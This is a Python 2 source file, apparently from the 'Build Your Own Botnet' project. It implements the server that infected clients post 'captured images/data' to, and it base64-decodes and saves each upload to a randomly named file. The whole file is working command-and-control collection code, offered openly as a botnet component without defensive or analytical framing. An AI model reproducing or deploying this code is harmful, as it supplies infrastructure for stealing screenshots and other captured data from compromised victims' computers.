#!/usr/bin/python
'Post Request Handler (Build Your Own Botnet)'

# standard library
import sys
import json
import string
import base64
import random
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

# utilities
import util


class Handler(BaseHTTPRequestHandler):
	""" 
	HTTP POST request handler for clients uploading
	captured images/data to the server

	"""
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_POST(self):
		""" 
		Handle incoming HTTP POST request

		"""
		self._set_headers()
		self.data_string = self.rfile.read(int(self.headers['Content-Length']))
		self.send_response(200)
		self.end_headers()
		data = json.loads(self.data_string)
		ftype = data.keys()[0]
		fname = 'data/{}.{}'.format(str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]), ftype)
		data = base64.b64decode(data.get(ftype))
		with file(fname, 'wb') as fp:
			fp.write(data)


def run(server_class=HTTPServer, handler_class=Handler, port=80):
	httpd = server_class(('0.0.0.0', port), handler_class)
	httpd.serve_forever()

def main():
	port = int(sys.argv[1])
	run(port=port)

if __name__ == '__main__':
	main()

